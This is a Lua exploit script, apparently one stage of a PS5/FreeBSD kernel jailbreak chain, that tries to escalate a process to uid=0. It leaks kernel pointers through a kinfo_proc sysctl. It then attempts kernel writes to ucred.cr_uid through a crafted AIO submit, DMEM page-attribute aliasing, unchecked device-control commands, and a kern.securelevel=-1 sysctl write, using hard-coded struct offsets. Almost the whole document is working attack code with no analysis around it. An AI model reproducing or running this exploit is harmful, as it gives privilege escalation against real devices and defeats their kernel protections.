-- CRASH_CLASS: HIGH
-- PROBE 55b: Post-KASLR kernel write — escalate to uid=0
--
-- Prerequisites: 55a found kernel base address. Fill in kbase_hi/kbase_lo.
-- Goal: write to kernel memory to zero our uid (privilege escalation)
--
-- Write primitives attempted:
--   Method A: AIO 661 with deobfuscated kernel pointer as target buffer
--   Method B: sys 588 DMEM page flip to alias kernel page, then write via alias
--   Method C: sys 622 device control crafted command
--   Method D: sysctl write (kern.securelevel = -1)
--
-- Target offsets (FreeBSD r230171 / AMD64):
--   proc.p_ucred    = +0x40
--   ucred.cr_uid     = +0x04
--   ucred.cr_ruid    = +0x08
--   ucred.cr_ngroups = +0x14
--   ucred.cr_groups[0] = +0x18
--   ucred.cr_prison  = +0x30
--   proc.p_fd        = +0x48

print("=== PROBE 55b: POST-KASLR KERNEL WRITE ===")
print("")

-- ====== FILL THESE IN FROM 55a RESULTS ======
local kbase_hi = 0xFFFF8000  -- upper 32 bits of kernel base
local kbase_lo = 0x00000000  -- lower 32 bits (from 55a)
local proc_addr_hi = 0       -- our proc struct address (from 55a kinfo_proc)
local proc_addr_lo = 0
-- =============================================

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end
local function mk_addr(hi, lo)
    return uint64(string.format("0x%X%08X", hi, lo))
end

local sc202 = make_syscall(202)   -- sysctl
local sc588 = make_syscall(588)   -- DMEM page attr
local sc622 = make_syscall(622)   -- device control
local sc661 = make_syscall(661)   -- AIO submit
local sc20  = make_syscall(20)    -- getpid

-- Get our PID
local pid = 0
do
    local ok, ret = pcall(function() return sc20() end)
    if ok then pid = to_num(ret) end
end
print("[*] Our PID: " .. pid)

-- Verify kernel base is filled in
if kbase_lo == 0 and kbase_hi == 0xFFFF8000 then
    print("[!] WARNING: kbase_lo is still 0 — fill in from 55a results!")
    print("[!] Continuing with placeholder for structure testing...")
end

-- ============================================================
-- Phase 1: Locate our proc via kinfo_proc sysctl
-- ============================================================
print("")
print("[*] Phase 1: Get kinfo_proc for our process")

local outbuf = memory.alloc(0x800)
local oldlenp = memory.alloc(8)
local mib = memory.alloc(16)

safe_wd(mib, 1)        -- CTL_KERN
safe_wd(mib + 4, 14)   -- KERN_PROC
safe_wd(mib + 8, 1)    -- KERN_PROC_PID
safe_wd(mib + 12, pid)

for i = 0, 0x7FF, 4 do safe_wd(outbuf + i, 0) end
safe_wq(oldlenp, uint64(0x800))

local ok, ret = pcall(function()
    return sc202(uint64(mib), uint64(4), uint64(outbuf), uint64(oldlenp), uint64(0), uint64(0))
end)

local ki_size = 0
if ok and signed32(ret) == 0 then
    ki_size = to_num(safe_rq(oldlenp))
    print("  kinfo_proc size: " .. ki_size .. " bytes")

    -- Scan for kernel pointers in kinfo_proc
    print("  Scanning kinfo_proc for kernel pointers...")
    for off = 0, math.min(ki_size, 0x7F8) - 8, 8 do
        local q = safe_rq(outbuf + off)
        if q then
            local h, l = get_hi_lo(q)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("    +0x%03X: %s  <<< KERNEL PTR", off, hexval(q)))
                -- Check if this could be proc or ucred
                if off >= 0x00 and off <= 0x10 then
                    print("      ^ Early struct pointer — could be proc itself")
                end
            end
        end
    end
else
    print("  sysctl failed: " .. (ok and tostring(signed32(ret)) or tostring(ret)))
end

-- ============================================================
-- Phase 2: Method A — AIO write to kernel address
-- ============================================================
print("")
print("[*] Phase 2: AIO kernel write attempt")
print("    If AIO 661 survived in 54c, try writing to kernel addr")

-- Pointer obfuscation reversal
local function deobfuscate(val)
    local h, l = get_hi_lo(val)
    local combined = h * 0x100000000 + l
    local result = 0
    for nibble = 15, 0, -1 do
        local shift = nibble * 4
        local enc_nibble = math.floor(combined / (2^shift)) % 16
        local prev_nibble = math.floor(result / (2^(shift+4))) % 16
        local dec_nibble = (enc_nibble ~ prev_nibble) % 16
        result = result + dec_nibble * (2^shift)
    end
    return result
end

if proc_addr_hi ~= 0 then
    -- We have a proc address — try to write uid=0 at proc+0x40+0x04
    local ucred_off = 0x40
    local uid_off = 0x04
    local target_hi = proc_addr_hi
    local target_lo = proc_addr_lo + ucred_off + uid_off

    print(string.format("  Target (proc+0x44 = ucred.cr_uid): 0x%08X_%08X", target_hi, target_lo))

    -- Prepare a buffer with zeros (uid=0)
    local wbuf = memory.alloc(0x100)
    for i = 0, 0xFF, 4 do safe_wd(wbuf + i, 0) end

    -- AIO submit with kernel target as output buffer
    local aiocb = memory.alloc(0x100)
    for i = 0, 0xFF, 4 do safe_wd(aiocb + i, 0) end
    -- aio_fildes at +0
    safe_wd(aiocb, 1) -- stdout fd
    -- aio_buf at +0x10 (pointer to our data)
    safe_wq(aiocb + 0x10, mk_addr(target_hi, target_lo))
    -- aio_nbytes at +0x18
    safe_wq(aiocb + 0x18, uint64(4))
    -- aio_offset at +0x08
    safe_wq(aiocb + 0x08, uint64(0))

    local ok2, ret2 = pcall(function()
        return sc661(uint64(aiocb), uint64(0), uint64(0), uint64(0))
    end)
    if ok2 then
        print("  AIO submit ret=" .. signed32(ret2))
        if signed32(ret2) == 0 then
            print("  >>> AIO ACCEPTED — kernel write may have occurred!")
            -- Verify by reading our uid
            local sc_getuid = make_syscall(24)
            local ok3, uid = pcall(function() return sc_getuid() end)
            if ok3 then
                print("  Current uid after write: " .. to_num(uid))
                if to_num(uid) == 0 then
                    print("  >>>>>> ROOT! uid=0 achieved! <<<<<<")
                end
            end
        end
    else
        print("  AIO submit crashed: " .. tostring(ret2))
    end
else
    print("  [SKIP] No proc address — fill in proc_addr_hi/lo from 55a")
end

-- ============================================================
-- Phase 3: Method B — sys 588 DMEM alias kernel page
-- ============================================================
print("")
print("[*] Phase 3: sys 588 DMEM page attribute manipulation")
print("    If 54d showed 588 succeeds, try to create writable alias")

local attr_struct = memory.alloc(0x40)

-- Try to map kernel page into DMEM-accessible range
-- DMEM handler checks addr >> 0x28 <= 0xE
-- Kernel addresses are 0xFFFF8xxx which >> 0x28 = 0xFFFFF (way above 0xE)
-- So we can't directly target kernel addresses
-- BUT: if DMEM region overlaps with kernel physical memory...

-- Try physical address ranges that might alias kernel memory
-- PS5 physical memory layout: kernel typically at phys 0x01000000+
local phys_tests = {
    {0x01, 0x00000000, "phys 0x100000000"},
    {0x02, 0x00000000, "phys 0x200000000"},
    {0x00, 0x01000000, "phys 0x01000000"},
    {0x00, 0x10000000, "phys 0x10000000"},
}

for _, pt in ipairs(phys_tests) do
    for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
    safe_wd(attr_struct, 0x07)  -- RWX

    local addr = mk_addr(pt[1], pt[2])
    local ok2, ret2 = pcall(function()
        return sc588(addr, uint64(0x4000), uint64(attr_struct))
    end)
    if ok2 then
        local rv = signed32(ret2)
        print(string.format("  588(%s, 0x4000) = %d%s", pt[3], rv,
            rv == 0 and "  <<< SUCCESS" or ""))
    else
        print(string.format("  588(%s) CRASHED", pt[3]))
    end
end

-- ============================================================
-- Phase 4: Method C — sys 622 device write
-- ============================================================
print("")
print("[*] Phase 4: sys 622 device control kernel write")
print("    If 54e found working commands, try write-like commands")

-- From binary analysis: 534/561 commands unchecked
-- Some device commands may take (addr, value) pairs
local cmdbuf = memory.alloc(0x100)

-- Try commands that might do memory writes
-- Command format guesses based on ioctl patterns
local write_cmds = {0x10, 0x20, 0x40, 0x80, 0xC0, 0x100}

for _, cmd in ipairs(write_cmds) do
    for i = 0, 0xFF, 4 do safe_wd(cmdbuf + i, 0) end
    -- Put a target address and value in the buffer
    if proc_addr_hi ~= 0 then
        safe_wq(cmdbuf, mk_addr(proc_addr_hi, proc_addr_lo + 0x44))
        safe_wq(cmdbuf + 8, uint64(0))  -- value = 0 (uid)
    end

    local ok2, ret2 = pcall(function()
        return sc622(uint64(cmd), uint64(cmdbuf), uint64(0x100), uint64(0), uint64(0))
    end)
    if ok2 then
        local rv = signed32(ret2)
        if rv == 0 then
            print(string.format("  cmd=0x%X ret=0  <<< ACCEPTED", cmd))
        end
    end
end

-- ============================================================
-- Phase 5: Method D — sysctl write kern.securelevel
-- ============================================================
print("")
print("[*] Phase 5: sysctl kern.securelevel write")

local slmib = memory.alloc(8)
safe_wd(slmib, 1)     -- CTL_KERN
safe_wd(slmib + 4, 35) -- KERN_SECURELVL (FreeBSD)

-- Read current value
local slbuf = memory.alloc(8)
local sllenp = memory.alloc(8)
safe_wd(slbuf, 0)
safe_wq(sllenp, uint64(4))

local ok2, ret2 = pcall(function()
    return sc202(uint64(slmib), uint64(2), uint64(slbuf), uint64(sllenp), uint64(0), uint64(0))
end)
if ok2 then
    print("  Read securelevel: ret=" .. signed32(ret2) .. " val=" .. (safe_rd(slbuf) or "nil"))
end

-- Try to write -1
local newval = memory.alloc(4)
safe_wd(newval, 0xFFFFFFFF) -- -1

local ok3, ret3 = pcall(function()
    return sc202(uint64(slmib), uint64(2), uint64(0), uint64(0), uint64(newval), uint64(4))
end)
if ok3 then
    local rv = signed32(ret3)
    print("  Write securelevel=-1: ret=" .. rv)
    if rv == 0 then
        print("  >>> SECURELEVEL SET TO -1!")
    end
end

-- ============================================================
-- Phase 6: If we got root (uid=0), verify and celebrate
-- ============================================================
print("")
print("[*] Phase 6: Final privilege check")

local sc_getuid = make_syscall(24)
local sc_geteuid = make_syscall(25)

local ok4, uid = pcall(function() return sc_getuid() end)
local ok5, euid = pcall(function() return sc_geteuid() end)

if ok4 then print("  uid  = " .. to_num(uid)) end
if ok5 then print("  euid = " .. to_num(euid)) end

if ok4 and to_num(uid) == 0 then
    print("")
    print("  ██████████████████████████████████████")
    print("  ██  ROOT ACHIEVED — uid=0          ██")
    print("  ██████████████████████████████████████")
    print("")
    print("  Next: run 55f_post_jail.lua for full escalation")
end

print("")
print("=== PROBE 55b COMPLETE ===")
